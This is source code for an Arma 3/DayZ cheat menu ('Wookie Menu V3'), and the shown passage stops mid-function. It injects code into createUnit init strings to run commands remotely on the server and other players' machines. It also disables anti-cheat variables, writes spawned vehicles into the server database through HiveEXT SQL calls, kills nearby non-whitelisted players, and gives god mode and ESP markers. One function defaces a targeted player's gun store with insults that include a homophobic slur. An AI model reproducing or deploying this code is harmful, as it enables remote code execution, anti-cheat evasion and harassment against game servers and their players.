Wookie_List = 
{
	Wookie_Added_Greenlist + [getPlayerUID player,"0"];
};
	
Wookie_Pro_RE =
{
	GangSta = 'O_Soldier_F' createUnit [[0,0,0], (createGroup east), (_this select 0), 0.5, "CORPORAL"];
};

Wookie_Car_RE =
{
	'O_Soldier_F' createUnit [[0,0,0], (createGroup east), (_this select 0), 0.5, "CORPORAL"];	
	_init_localpublish = '
	local_publishObj = {
		_charID = _this select 0;
		object = _this select 1;
		_worldspace = _this select 2;
		_className = _this select 3;
		_id = 0;
		_dir = _worldspace select 0;
		_location = _worldspace select 1;
		call compile ("object = create" + "Vehicle [_className, _location, [], 0, ""	""];
		object setdir _dir;
		object setPosATL _location;
		object setVariable [""OwnerID"", _charID, true];");
		dayz_serverObjectMonitor set [count dayz_serverObjectMonitor,object];
		_uid = object call dayzobjectUID;
		object setVariable ["ObjectUID", _uid, true];
		};
	';
[_init_localpublish] call Wookie_Pro_RE;
};

AntiAntiAntiAntiHax =
{
	if ((isServer) or (isDedicated)) then
	{
		_antihax = '
			"clientStarted" addPublicVariableEventHandler {};
			"AHAH" addPublicVariableEventHandler {};
			"clientStarted" addPublicVariableEventHandler {};
			"dat4ClientStarted" addPublicVariableEventHandler {};
			"SADTOYCATS" addPublicVariableEventHandler {};
			"ahClientStarted" addPublicVariableEventHandler {};
			ahClientStarted = {};
			SADTOYCATS = {};
			THISIS43SPARTA = {};
			AHAH = {};
			clientStarted = {};
			dat4ClientStarted = {};
			hackFlag = [nil, nil, nil];
			cheatFlag = [nil, nil, nil];
		';
		[_antihax] call Wookie_Pro_RE;
	};

	_remexec = '
		"clientStarted" addPublicVariableEventHandler {};
		"AHAH" addPublicVariableEventHandler {};
		"clientStarted" addPublicVariableEventHandler {};
		"dat4ClientStarted" addPublicVariableEventHandler {};
		"SADTOYCATS" addPublicVariableEventHandler {};
		"ahClientStarted" addPublicVariableEventHandler {};
		ahClientStarted = {};
		SADTOYCATS = {};
		THISIS43SPARTA = {};
		AHAH = {};
		clientStarted = {};
		dat4ClientStarted = {};
		hackFlag = [nil, nil, nil];
		cheatFlag = [nil, nil, nil];
	';
	[_remexec] call Wookie_Pro_RE;
};

Wookie_Debug_Mon =
{
	if (!(isNil "Dayz_GUI_R") or !(isNil "dayz_originalPlayer") or !(isNil "r_player_blood")) then
	{
		if (isNil "Wookie_Debug_1337") then {Wookie_Debug_1337 = true;} else {Wookie_Debug_1337 = !Wookie_Debug_1337;onEachFrame {};hintSilent parseText format ["<t size='1'font='puristaMedium'align='center'>DEBUG OFF</t>"];};
		if (Wookie_Debug_1337) then
		{
		onEachFrame
			{
				_vehname = (gettext (configFile >> 'CfgVehicles' >> (typeof vehicle player) >> 'displayName'));
				if (player != vehicle player) then {_vehname = (gettext (configFile >> 'CfgVehicles' >> (typeof vehicle player) >> 'displayName'));} else {_vehname = 'None';};
				
				hintSilent parseText format["
				<t size='1.5'font='puristaMedium'align='Center' color='#ffc726'>Wookie Monitor</t><br/><br/>
				<t size='1.2'font='puristaMedium'align='left' color='#86abd9'>Player Online:</t><t size='1.2'font='puristaMedium'align='right'color='#86abd9'>%5</t><br/>
				<t size='1.2'font='puristaMedium'align='left' color='#86abd9'>Player in 500m:</t><t size='1.2'font='puristaMedium'align='right'color='#86abd9'>%6</t><br/>
				<t size='1.2'font='puristaMedium'align='left' color='#86abd9'>Viewdistance:</t><t size='1.2'font='puristaMedium'align='right'color='#86abd9'>%12</t><br/>
				<br/>
				<t size='1.2'font='puristaMedium'align='left'color='#86abd9'>Vehicles:</t><t size='1.2' font='puristaMedium'align='right'color='#86abd9'>%8(%10)</t><br/>
				<t size='1.2'font='puristaMedium'align='left'color='#86abd9'>Air:</t><t size='1.2' font='puristaMedium'align='right'color='#86abd9'>%9</t><br/>
				<t size='1.2'font='puristaMedium'align='left'color='#86abd9'>Tank:</t><t size='1.2' font='puristaMedium'align='right'color='#86abd9'>%7</t><br/>
				<t size='1.2'font='puristaMedium'align='left'color='#86abd9'>Car:</t><t size='1.2' font='puristaMedium'align='right'color='#86abd9'>%11</t><br/>
				<br/>
				<t font='puristaMedium' align='Center' size='1.3' color='#FFBF00'>Vehicle: %3</t><br/>
				<img size='5' image='%4'/><br/>
				<t size='1.2'font='puristaMedium'align='left' color='#86abd9'>Humanity:</t><t color='#86abd9' size='1.2'font='puristaMedium'align='right'>%12</t><br/>
				<t size='1.2'font='puristaMedium'align='left' color='#86abd9'>Blood:</t><t color='#86abd9' size='1.2'font='puristaMedium'align='right'>%13</t><br/>
				<t size='1.2'font='puristaMedium'align='left' color='#86abd9'>Name:</t><t color='#86abd9' size='1.2'font='puristaMedium'align='right'>%1</t><br/>
				<t size='1.2'font='puristaMedium'align='center'color='#86abd9'>Fps: %2</t>
				",

				(player getVariable['bodyName', name player]),
				(round diag_fps),
				_vehname,
				(gettext (configFile >> 'CfgVehicles' >> (typeof vehicle player) >> 'picture')),
				(count playableUnits),
				(({isPlayer _x} count (getPosATL vehicle player nearEntities [['AllVehicles'], 500]))-1),
				(count([6800, 9200, 0] nearEntities [['Tank'],25000])),
				(count([6800, 9200, 0] nearEntities [['StaticWeapon','Car','Motorcycle','Tank','Air','Ship'],25000])),
				(count([6800, 9200, 0] nearEntities [['Air'],25000])),
				count vehicles,
				(count([6800, 9200, 0] nearEntities [['Car'],25000])),
				viewdistance,
				r_player_blood,
				round _humanity
				];
			};
		};
	};
		
	if ((isNil "Dayz_GUI_R") or (isNil "dayz_originalPlayer") or (isNil "r_player_blood")) then
	{
		if (isNil "Wookie_Debug_1337") then {Wookie_Debug_1337 = true;} else {Wookie_Debug_1337 = !Wookie_Debug_1337;onEachFrame {};hintSilent parseText format ["<t size='1'font='puristaMedium'align='center'>DEBUG OFF</t>"];};
		if (Wookie_Debug_1337) then
		{
			onEachFrame
			{
				_vehname = (gettext (configFile >> 'CfgVehicles' >> (typeof vehicle player) >> 'displayName'));
				if (player != vehicle player) then {_vehname = (gettext (configFile >> 'CfgVehicles' >> (typeof vehicle player) >> 'displayName'));} else {_vehname = 'None';};
				
				_plrpic = "A3\data_f\Flags\flag_blue_co.paa";
				if (revive_mon_side == west) then {_plrpic = "A3\data_f\Flags\flag_blue_co.paa";};
				if (side player == east) then {_plrpic = "A3\data_f\Flags\flag_red_co.paa";};
				if (side player == resistance) then {_plrpic = "A3\data_f\Flags\flag_green_co.paa";};
				if (revive_mon_side == civilian) then {_plrpic = "A3\data_f\Flags\flag_white_co.paa";};
			
				hintSilent parseText format["
				<t size='1.5'font='puristaMedium'align='Center' color='#ffc726'>Wookie Monitor</t><br/>
				<br/>
				<img size='1.2' align='Center' image='%4'/><t font='puristaMedium' align='Center' size='1.2' color='#86abd9'> %1</t><br/>
				<t size='1.2'font='puristaMedium'align='center'color='#86abd9'>Current Weapon:</t><br/>
				<t size='1.2'font='puristaMedium'align='center'color='#86abd9'>%5</t><br/>
				<img size='2' align='Center' image='%6'/><br/>
				<t font='puristaMedium' align='Center' size='1.2' color='#86abd9'>Current Vehicle:</t><br/>
				<t font='puristaMedium' align='Center' size='1.2' color='#86abd9'>%3</t><br/>
				<br/>
				<t font='puristaMedium' align='Center' size='1.5' color='#ffc726'>Server Info:</t><br/>
				<br/>
				<t size='1.2'font='puristaMedium'align='left' color='#86abd9'>Player's Online:</t><t size='1.2'font='puristaMedium'align='right'color='#86abd9'>%7</t><br/>
				<t size='1.2'font='puristaMedium'align='left' color='#86abd9'>Player's in 500m:</t><t size='1.2'font='puristaMedium'align='right'color='#86abd9'>%8</t><br/>
				<t size='1.2'font='puristaMedium'align='left'color='#86abd9'>Total Vehicle's</t><t size='1.2' font='puristaMedium'align='right'color='#86abd9'>%9</t><br/>
				<t size='1.2'font='puristaMedium'align='left'color='#86abd9'>Air:</t><t size='1.2' font='puristaMedium'align='right'color='#86abd9'>%10</t><br/>
				<t size='1.2'font='puristaMedium'align='left'color='#86abd9'>Car:</t><t size='1.2' font='puristaMedium'align='right'color='#86abd9'>%11</t><br/>
				<br/>
				<t size='1.2'font='puristaMedium'align='center'color='#86abd9'>Fps: %2</t><br/>	
				",
	
				(player getVariable['bodyName', name player]),
				(round diag_fps),
				_vehname,
				_plrpic,
				(gettext (configFile >> 'CfgWeapons' >> (currentweapon player) >> 'displayName')),
				(gettext (configFile >> 'CfgWeapons' >> (currentweapon player) >> 'picture')),
				(count playableUnits),
				(({isPlayer _x} count (getPosATL vehicle player nearEntities [['AllVehicles'], 500]))-1),
				(count([6800, 9200, 0] nearEntities [['StaticWeapon','Car','Motorcycle','Tank','Air','Ship'],25000])),
				(count([6800, 9200, 0] nearEntities [['Air'],25000])),
				(count([6800, 9200, 0] nearEntities [['Car'],25000]))
				];
			};
		};
	};
};

Veh_Spawn_Shitt =
{
	if (!(isNil "Dayz_GUI_R") or !(isNil "dayz_originalPlayer") or !(isNil "r_player_blood")) then
	{
		_veh = _this;
		_veh_type=_veh;
		TitleText [format["%1 SPAWN UN",_veh_type], "PLAIN DOWN"];
		_dir = getdir player;
		_pos = getPosATL player;
		_pos = [(_pos select 0)-5*sin(_dir),(_pos select 1)-5*cos(_dir),0];
		_xos = _pos select 0;
		_yos = _pos select 1;
		_zos = _pos select 2;
		// _rid = 999+random(9999);
		_rid = 1;
		_bitch = format["
		if (isServer) then 
		{
			call compile (""ZoombiesCar = create"" + ""Vehicle ['%1', [%2, %3, %4], [], 0, ''];  
			ZoombiesCar setVariable ['OwnerID', 0, true];
			_uid = ZoombiesCar call dayz_objectUID;
			ZoombiesCar setVariable ['ObjectUID', _uid, true];
			ZoombiesCar setVariable ['ObjectID', _uid, true];
			ZoombiesCar setvariable ['vehicule_info_parvariable',['[SFP] Maxou'],true];
			ZoombiesCar setvariable ['voiture_possede_une_puce',[7,0],true];
			ZoombiesCar setvariable ['voiture_possede_un_detecteur_de_radar',[1,0],true];
			dayz_serverObjectMonitor se"" + ""t [count dayz_serverObjectMonitor, ZoombiesCar];""); 
			publicVariable ""ZoombiesCar"";
		}", _veh_type, _xos, _yos, _zos, _rid];
		nilx2 = [_bitch] call Wookie_Pro_RE;
		sleep 2;
		["if (isServer) then 
		{
			ZoombiesCarName = typeOf ZoombiesCar;
			ZoombiesCarPos = getPosATL ZoombiesCar;
			ZoombiesCarDir = getDir ZoombiesCar;
			_key = format[""CHILD:999:select `id` from `vehicle` where `class_name` = '?' LIMIT 1:[""""%1""""]:"",ZoombiesCarName];
			_data = ""HiveEXT"" callExtension _key;             
			result = call compile format [""%1"", _data];
			_status = _result select 0;
			if (_status == ""CustomStreamStart"") then 
			{
				""HiveEXT"" callExtension _key;
				_temp = _result select 1;
				if (_temp == 0) then
				{
					_data = ""HiveEXT"" callExtension format[""CHILD:999:Insert into vehicle 
					(class_name, damage_min, damage_max, fuel_min, fuel_max, limit_min, limit_max, parts, inventory)
					values
					('?',0,0,1.0,1.0,0,99,'',''):[""""%1""""]:"", ZoombiesCarName];
				};	
			};
			_data = ""HiveEXT"" callExtension format[""CHILD:999:Insert into world_vehicle
			(vehicle_id, world_id, worldspace, chance)
			values
			((SELECT `id` FROM `vehicle` where `class_name` = '?' LIMIT 1), 1, '',1):[""""%1"""", """"%2""""]:"", ZoombiesCarName, worldName];
			_data = ""HiveEXT"" callExtension format[""CHILD:999:Insert into instance_vehicle
			(world_vehicle_id, instance_id, worldspace, inventory, parts, fuel, damage)
			values
			((SELECT `id` FROM `world_vehicle` where `vehicle_id` = (SELECT `id` FROM `vehicle` where `class_name` = '%1' LIMIT 1) LIMIT 1), %3, '%2','[[[],[]],[[],[]],[[],[]]]','[]',1,0):[]:"", ZoombiesCarName, [ZoombiesCarDir, ZoombiesCarPos], dayZ_instance];

			_key = format[""CHILD:999:SELECT `id` FROM `instance_vehicle` ORDER BY `id` DESC LIMIT 1:[]:""];
			_data = ""HiveEXT"" callExtension _key;             
			_result = call compile format [""%1"", _data];
			_status = _result select 0;
			if (_status == ""CustomStreamStart"") then {
				_temp = _result select 1;
				if (_temp == 1) then
				{
					_data = ""HiveEXT"" callExtension _key;
					_result = call compile format [""%1"", _data];
					_status = _result select 0;
				};
			};
			ZoombiesCar setVariable [""lastUpdate"",time];
			ZoombiesCar setVariable [""ObjectID"", str(_status), true];
			ZoombiesCar setVariable [""CharacterID"", ""1337"", true];
			if (ZoombiesCar isKindOf ""AllVehicles"") then { ZoombiesCar call fnc_vehicleEventHandler;};
			if (ZoombiesCar isKindOf ""TentStorage"") then {ZoombiesCar addMPEventHandler [""MPKilled"",{_this call vehicle_handleServerKilled;}];};
		};"] call Wookie_Pro_RE;
	}
	else
	{
		_veh_type=_this;
		_dir = getdir player;
		_pos = getPosATL player;
		_pos = [(_pos select 0)+8*sin(_dir),(_pos select 1)+8*cos(_dir),0];
		_xos = _pos select 0;
		_yos = _pos select 1;
		_zos = _pos select 2;
		// _rid = 999+random(99999);
		_rid = 1;
		lysto_veh = format["
		if (isServer) then 
		{
			call compile (""_object = create"" + ""Vehicle ['%1', [%2, %3, %4], [], 0, ''];
			_uid = _object call objectUID;
			_object setvariable ['vehicule_info_parvariable',['[SFP] Maxou'],true];
			_object setvariable ['voiture_possede_une_puce',[7,0],true];
			_object setvariable ['voiture_possede_un_detecteur_de_radar',[1,0],true];
			_object setVariable ['ObjectID', %5, true];
			_object setVariable ['ObjectUID', _uid, true];
			_object setVariable ['OwnerID', 0, true];
			_object setDir %6;
			serverObjectMonitor set [count serverObjectMonitor, _object];
			"");
		};",_veh_type, _xos, _yos, _zos, _rid,_dir];
		[lysto_veh] call Wookie_Pro_RE;
		cutText [format["%1 SPAWN DEUX",_veh_type], "PLAIN DOWN"];
	};
};

Wookie_FuckUp_GunStore =
{
	_name = _this select 0;

	_reeeee = format["if (name player == '%1') then
	{
		weaponsArray = [
			[""LMAO"",""hgun_P07_F"",99999,0],
			[""Faggot"",""hgun_P07_F"",99999,0],
			[""Your"",""hgun_P07_F"",99999,0],
			[""Gun"",""hgun_P07_F"",99999,0],
			[""Store"",""hgun_P07_F"",99999,0],
			[""Got Fucked"",""hgun_P07_F"",99999,0],
			[""Hahahaha"",""hgun_P07_F"",99999,0],
			["""",""hgun_P07_F"",99999,0],
			["""",""hgun_P07_F"",99999,0],
			[""Wookie Menu V3"",""hgun_P07_F"",99999,0],
			[""www.mpgh.net"",""hgun_P07_F"",99999,0]
		];
		
		
		ammoArray = [
			[""LMAO"",""16Rnd_9x21_Mag"",99999],
			[""Faggot"",""16Rnd_9x21_Mag"",99999],
			[""Your"",""16Rnd_9x21_Mag"",99999],
			[""Gun"",""16Rnd_9x21_Mag"",99999],
			[""Store"",""16Rnd_9x21_Mag"",99999],
			[""Got Fucked"",""16Rnd_9x21_Mag"",99999],
			[""Hahahaha"",""16Rnd_9x21_Mag"",99999],
			["""",""16Rnd_9x21_Mag"",99999],
			["""",""16Rnd_9x21_Mag"",99999],
			[""Wookie Menu V3"",""16Rnd_9x21_Mag"",99999],
			[""www.mpgh.net"",""16Rnd_9x21_Mag"",99999]
			
		];
		
		
		accessoriesArray = [
			[""LMAO"",""B_AssaultPack_dgtl"",99999,""item""],
			[""Faggot"",""B_AssaultPack_dgtl"",99999,""item""],
			[""Your"",""B_AssaultPack_dgtl"",99999,""item""],
			[""Gun"",""B_AssaultPack_dgtl"",99999,""item""],
			[""Store"",""B_AssaultPack_dgtl"",99999,""item""],
			[""Got Fucked"",""B_AssaultPack_dgtl"",99999,""item""],
			[""Hahahaha"",""B_AssaultPack_dgtl"",99999,""item""],
			["""",""B_AssaultPack_dgtl"",99999,""item""],
			["""",""B_AssaultPack_dgtl"",99999,""item""],
			[""Wookie Menu V3"",""B_AssaultPack_dgtl"",99999,""item""],
			[""www.mpgh.net"",""B_AssaultPack_dgtl"",99999,""item""]
		];
	};", _name];
	[_reeeee] call Wookie_Pro_RE;
	TitleText [format["%1's Gunstore has been fucked",_name], "PLAIN DOWN"];
};

Wep_Spawn_Shitt =
{
	_name = _this select 0;
	_wep = _this select 1;

	if (!(isNil "Dayz_GUI_R") or !(isNil "dayz_originalPlayer")) then {


		if ((_name == name player) or (_name == "")) then 
		{
			_magsremove = getArray (configfile >> 'cfgWeapons' >> primaryweapon player >> 'magazines');
			_magsremove = _magsremove select 0;
			player removeMagazines _magsremove;
			player removeWeapon primaryweapon player;
			player addWeapon _wep;
			_mags = getArray (configfile >> 'cfgWeapons' >> _wep >> 'magazines');
			_mag = _mags select 0;
			player addMagazine _mag;
			player addMagazine _mag;
			player addMagazine _mag;
			player addMagazine _mag;
			player addMagazine _mag;
			player selectWeapon _wep;
			reload player;
		
			player addWeapon 'ItemCompass';
		
			if !('ItemHatchet' in items player) then {player addweapon 'ItemHatchet';};
			if !('ItemKnife' in items player) then {player addweapon 'ItemKnife';};
			if !('Itemmatchbox' in items player) then {player addweapon 'Itemmatchbox';};
			if !('Itemetool' in items player) then {player addweapon 'Itemetool';};
			if !('Itemtoolbox' in items player) then {player addweapon 'Itemtoolbox';};

			if !('ItemMap' in items player) then {player addweapon 'ItemMap';};
			if !('ItemGPS' in items player) then {player addweapon 'ItemGPS';};
			if !('Binocular_Vector' in items player) then {player addweapon 'Binocular_Vector';};
			if !('NVGoggles' in items player) then {player addweapon 'NVGoggles';};

			if !('ItemMorphine' in items player) then {player addMagazine 'ItemMorphine';};
			if !('ItemEpinephrine' in items player) then {player addMagazine 'ItemEpinephrine';};
			if !('ItemPainkiller' in items player) then {player addMagazine 'ItemPainkiller';};
			if !('ItemBloodbag' in items player) then {player addMagazine 'ItemBloodbag';};
			if !('ItemWaterbottle' in items player) then {player addMagazine 'ItemWaterbottle';};
			if !('FoodCanBakedBeans' in items player) then {player addMagazine 'FoodCanBakedBeans';player addMagazine 'FoodCanBakedBeans';};

			player addBackpack 'DZ_Backpack_EP1';
			(Unitbackpack player) addMagazineCargo ['30Rnd_556x45_Stanag', 3];
			(Unitbackpack player) addMagazineCargo ['ItemSodaMdew', 2];
			(Unitbackpack player) addMagazineCargo ['ItemWaterbottle', 1];
			(Unitbackpack player) addMagazineCargo ['FoodCanBakedBeans', 2];
			(Unitbackpack player) addMagazineCargo ['ItemBandage', 2];
			(Unitbackpack player) addMagazineCargo ['ItemBloodbag', 1];
			(Unitbackpack player) addMagazineCargo ['FoodCanPasta', 1];
			(Unitbackpack player) addMagazineCargo ['ItemAntibiotic', 1];

			if !('ItemBandage' in items player) then 
			{
				player addMagazine 'ItemBandage';
				player addMagazine 'ItemBandage';
				player addMagazine 'ItemBandage';
			};

			cutText [format["%1 added",_wep], "PLAIN DOWN"];
		}
		else
		{
			_RE = format ["if (name player == '%1') then
			{
				_magsremove = getArray (configfile >> 'cfgWeapons' >> primaryweapon player >> 'magazines');
				_magsremove = _magsremove select 0;
				player removeMagazines _magsremove;
				player removeWeapon primaryweapon player;
				
				_wep = '%2';
				player addWeapon _wep;
				_mags = getArray (configfile >> 'cfgWeapons' >> _wep >> 'magazines');
				_mag = _mags select 0;
				player addMagazine _mag;
				player addMagazine _mag;
				player addMagazine _mag;
				player addMagazine _mag;
				player addMagazine _mag;
				player selectWeapon _wep;
				reload player;
			
				player addweapon 'NVGoggles';
				player addweapon 'Binocular_Vector';
				player addweapon 'ItemGPS';
				player addweapon 'ItemMap';
				player addWeapon 'ItemCompass';
				player addweapon 'ItemHatchet';
				player addweapon 'ItemKnife';
				player addweapon 'Itemmatchbox';
				player addweapon 'Itemetool';
				player addweapon 'Itemtoolbox';
			
				player addMagazine 'ItemMorphine';
				player addMagazine 'ItemEpinephrine';
				player addMagazine 'ItemPainkiller';
				player addMagazine 'ItemBloodbag';
				player addMagazine 'ItemWaterbottle';
				player addMagazine 'FoodCanBakedBeans';
				player addMagazine 'FoodCanBakedBeans';
				player addMagazine 'ItemAntibiotic';

				player addMagazine 'ItemBandage';
				player addMagazine 'ItemBandage';
				player addMagazine 'ItemBandage';
			
			};", _name, _wep];
			[_RE] call Wookie_Pro_RE;
		
			cutText [format["%1 --- %2 added",_name,_wep], "PLAIN DOWN"];
		};
	}
	else
	{
		if ((_name == name player) or (_name == "")) then 
		{
			_magsremove = getArray (configfile >> 'cfgWeapons' >> primaryweapon player >> 'magazines');
			_magsremove = _magsremove select 0;
			player removeMagazines _magsremove;
			player removeWeapon primaryweapon player;
		
		
			player addWeapon _wep;
			_mags = getArray (configfile >> 'cfgWeapons' >> _wep >> 'magazines');
			_mag = _mags select 0;
			player addMagazine _mag;
			player addMagazine _mag;
			player addMagazine _mag;
			player addMagazine _mag;
			player addMagazine _mag;
			player selectWeapon _wep;
			reload player;
		
			player addWeapon 'Binocular_Vector';
			player addWeapon 'NVGoggles';
			player addWeapon 'ItemGPS';
			player addWeapon 'ItemCompass';
			player addWeapon 'ItemMap';

			cutText [format["%1 added",_wep], "PLAIN DOWN"];
		}
		else
		{
			_RE = format ["if (name player == '%1') then
			{
				_magsremove = getArray (configfile >> 'cfgWeapons' >> primaryweapon player >> 'magazines');
				_magsremove = _magsremove select 0;
				player removeMagazines _magsremove;
				player removeWeapon primaryweapon player;
			
			
				_wep = '%2';
				player addWeapon _wep;
				_mags = getArray (configfile >> 'cfgWeapons' >> _wep >> 'magazines');
				_mag = _mags select 0;
				player addMagazine _mag;
				player addMagazine _mag;
				player addMagazine _mag;
				player addMagazine _mag;
				player addMagazine _mag;
				player selectWeapon _wep;
				reload player;
			
				player addWeapon 'Binocular_Vector';
				player addWeapon 'NVGoggles';
				player addWeapon 'ItemGPS';
				player addWeapon 'ItemCompass';
				player addWeapon 'ItemMap';
				
			};", _name, _wep];
			[_RE] call Wookie_Pro_RE;
		};
	};
};

Wookie_Init_Menu =
{
	[] spawn {
		if (isNil "WookieMenu_hax_toggled") then {WookieMenu_hax_toggled = [];};
		WookieMenu_funcs_inited = nil;
		if (isNil "WookieMenu_funcs_inited") then {call Wookie_Menu_LOOOOOOOOOL;};
		waitUntil {!isNil "WookieMenu_funcs_inited"};
		if (!isNull findDisplay 3030) exitWith {};
		if !(createDialog "RscConfigEditor_Main") exitWith {hintSilent "Créer Dialogue échoué";};
		call WookieMenu_initMenu;
		waitUntil {!dialog || !alive player};
	};
};

unlim =
{
	if (isnil ("Wookie_Unlim_Ammo")) then {Wookie_Unlim_Ammo = 0;};
	if (Wookie_Unlim_Ammo==0) then {Wookie_Unlim_Ammo=1;cutText [format["Unlimited Ammo on"], "PLAIN DOWN"];hint "Munitions Illimités Activé";}else{Wookie_Unlim_Ammo=0;cutText [format["Unlimited Ammo Off"], "PLAIN DOWN"];hint "Unlimited Ammo Off";};

	while {Wookie_Unlim_Ammo==1} do 
	{
		(vehicle player) setVehicleAmmo 1;

	sleep 1;
	};
};

No_Recoil =
{
	if (isnil ("Wookie_No_Recoil")) then {Wookie_No_Recoil = 0;};
	if (Wookie_No_Recoil==0) then {Wookie_No_Recoil=1;cutText [format["Unlimited Ammo on"], "PLAIN DOWN"];hint "Unlimited Ammo on";}else{Wookie_No_Recoil=0;cutText [format["Unlimited Ammo Off"], "PLAIN DOWN"];hint "Unlimited Ammo Off";};

	while {Wookie_No_Recoil==1} do 
	{
		(vehicle player) setUnitRecoilCoefficient 0;
	
	sleep 0.01;
	};
};

LowTerrain =
{
	if (isNil "Wookie_LowTerrian") then {Wookie_LowTerrian = true;} else {Wookie_LowTerrian = !Wookie_LowTerrian};
	if (Wookie_LowTerrian) then {
	setTerrainGrid 50;
	hint "Terrain Low";
	cutText [format["Terrain Low"], "PLAIN DOWN"];
	} else {
	setTerrainGrid 12.5;
	hint "Terrain Normal";
	cutText [format["Terrain Normal"], "PLAIN DOWN"];
	};
};

Wookie_God_MODE =
{
	if (!(isNil "Dayz_GUI_R") or !(isNil "dayz_originalPlayer")) then {

		if (isNil "Wookie_God_ModeLOL") then
		{
			Wookie_God_ModeLOL = true;
		};

		if (Wookie_God_ModeLOL) then
		{
			Wookie_God_ModeLOL = false;
			hint "GOD ON";
			cutText [format["GOD ON"], "PLAIN"];

			_Wookie = player;
			fnc_usec_damageHandler = nil;
			fnc_usec_unconscious  = nil;
			_Wookie removeAllEventHandlers "handleDamage";
			_nope = false;
			_Wookie addEventHandler ["handleDamage", {}];
			_Wookie allowDamage false;
		}
		else
		{
			Wookie_God_ModeLOL = true;
			hint "GOD OFF";
			cutText [format["GOD OFF"], "PLAIN"];
		
			fnc_usec_damageHandler = compile preprocessFileLineNumbers "\z\addons\dayz_code\compile\fn_damageHandler.sqf";
			fnc_usec_unconscious = compile preprocessFileLineNumbers "\z\addons\dayz_code\compile\fn_unconscious.sqf";
			player addEventHandler ["handleDamage", {true}];
			player removeAllEventHandlers "handleDamage";
			player allowDamage true;
		};

	}else{

		if (isNil "Wookie_G0d_Mode") then
		{
			Wookie_G0d_Mode = 0;
		};

		if (Wookie_G0d_Mode == 0) then
		{
			Wookie_G0d_Mode = 1;
			hint "GOD ON";
			cutText [format["GOD ON"], "PLAIN"];
		
			fnc_usec_damageHandler = {};
			fnc_usec_unconscious  = {};
			player removeAllEventHandlers "handleDamage";
			player addEventHandler ["handleDamage", {false}];
			player allowDamage false;
		}
		else
		{
			Wookie_G0d_Mode = 0;
			hint "GOD OFF";
			cutText [format["GOD OFF"], "PLAIN"];
		
			player addEventHandler ["handleDamage", {true}];
			player removeAllEventHandlers "handleDamage";
			player allowDamage true;
		};

	};
};

Wookie_CarGod_MODE =
{
	if (isnil "Wookie_Car_God" ) then {Wookie_Car_God=0};
	if (Wookie_Car_God==0) then
	{
		cutText [format["CarGodmode ON"], "PLAIN DOWN"];
		hint format["CarGodmode ON"];
		Wookie_Car_God = 1;
		Wookie_Car_God_lol = true;
	
		while {Wookie_Car_God_lol} do
		{
			if ((vehicle player isKindOf "LandVehicle") || (vehicle player isKindOf "Air") || (vehicle player isKindOf "Ship")) then 
			{
				if ((fuel (vehicle player)) < 0.9) then {vehicle player setFuel 1;};
				if ((damage (vehicle player)) != 0) then {vehicle player setdammage 0;player setdamage 0;};
			};
		sleep 0.045;
		};
	}
	else
	{
		cutText [format["CarGodmode OFF"], "PLAIN DOWN"];
		hint format["CarGodmode OFF"];
		Wookie_Car_God_lol = false;
		Wookie_Car_God = 0;
	};
};

Wookie_Shield =
{
_list = call Wookie_List;

	if (isNil "Wookie_PlayerShield") then {Wookie_PlayerShield = true;} else {Wookie_PlayerShield = false;};
	if (Wookie_PlayerShield) then {hint "PlayerShield ON";cutText [format["PlayerShield ON"], "PLAIN DOWN"];} else {hint "PlayerShield OFF";cutText [format["PlayerShield OFF"], "PLAIN DOWN"];};

	while {Wookie_PlayerShield} do

	{
		_pos = getPosATL vehicle player;
		_players = playableUnits;
		_units = playableUnits;
		_countunits = count _units;
		_countplayers = count _players;
		for "_i" from 0 to (_countplayers -1) do
		{	
			_player = _players select _i;	
			if((_player != player) && (_player distance player < 150)) then 
			{	
				for "_i2" from 0 to (_countunits -1) do
				{	
					_unit = _units select _i2;
				
					if((_unit == _player) && !(getPlayerUID _unit in _list)) then 
					{
						cutText [format["%1 has crossed the line!", name _player], "PLAIN DOWN"];
					
						_aim = _player;
					
						if (_aim isKindOf "Man") then
						{
							_aim setDamage 1;
						};
					};
				};
			};		
		};
	sleep 0.05;
	};
	
	if !(Wookie_PlayerShield) then 
	{
		Wookie_PlayerShield = nil;
	};
};

Wookie_PlayerM =
{
	if !("ItemMap" in items player) then {player addweapon "ItemMap";};
	Wookie_Noobs = [];
	Wookie_Bitches = [];

	if (isnil "Wookie_Map_Markers") then {Wookie_Map_Markers = 0;}; 
	if (Wookie_Map_Markers == 0) then {Wookie_Map_Markers = 1; hint "Player Markers ON";} else {Wookie_Map_Markers = 0; hint "Player Markers OFF";};

	while {Wookie_Map_Markers == 1} do
	{
		{
			//[_x] join grpNull;
			if ((vehicle _x isKindOf "LandVehicle") || (vehicle _x isKindOf "Air") || (vehicle _x isKindOf "Ship")) then 
			{
				if (count (crew vehicle _x) > 0) then 
				{
					{
						if (!(_x in Wookie_Noobs) and (alive _x) and (getPlayerUID _x != "")) then 
						{
							private ["_pos", "_mkr", "_vhc"];
							_vhc = vehicle _x;
							_pos = visiblePosition _x;
							_mkr = createMarkerLocal [format ["CRW%1%2", _pos select 0, _pos select 1], [(_pos select 0) + 20, _pos select 1, 0]]; 
							_vehname = (gettext (configFile >> 'CfgVehicles' >> (typeof vehicle _x) >> 'displayName'));
							_mkr setMarkerTextLocal format[' %1 --- %2 --- %3m',name _x,_vehname,round(_x distance player)];
							_mkr setMarkerTypeLocal "mil_dot"; 
							if ((side _x == side player) and (side _x != resistance)) then {_mkr setMarkerColorLocal "ColorBlue";}else{_mkr setMarkerColorLocal "ColorRed";};
							_mkr setMarkerSizeLocal [1,1];

							Wookie_Noobs set [count Wookie_Noobs, _x];
							[_x, _mkr,_vhc] spawn 
							{
								private ["_u", "_m","_pc"]; 
								_u = _this select 0; 
								_m = _this select 1; 
								while {(Wookie_Map_Markers == 1) and (alive _u) and (vehicle _u != _u) and (getPlayerUID _u != "")} do 
								{
									_pc = ((crew vehicle _u) find _u); 
									_m setMarkerPosLocal ([(visiblePosition _u select 0) + 20, (visiblePosition _u select 1) - (25 + _pc*20), 0]); 
									sleep 0.01; 
								}; 
								deleteMarkerLocal _m;	
								if (_u in Wookie_Noobs) then 
								{ 
									Wookie_Noobs set [(Wookie_Noobs find _u), -1]; 
									Wookie_Noobs = Wookie_Noobs - [-1]; 			
								}; 					
								true;
							};
						};
					} forEach crew vehicle _x;
				}; 
			}
			else	
			{
				if (!(_x in Wookie_Bitches) and (vehicle _x == _x) and (getPlayerUID _x != "")) then 			 
				{
					private ["_pos", "_mkr"]; 
					_pos = visiblePosition _x;
				
					_mkr = createMarkerLocal [format ["PLR%1%2", _pos select 0, _pos select 1], [(_pos select 0) + 20, _pos select 1, 0]]; 
					_mkr setMarkerTypeLocal "mil_dot";  
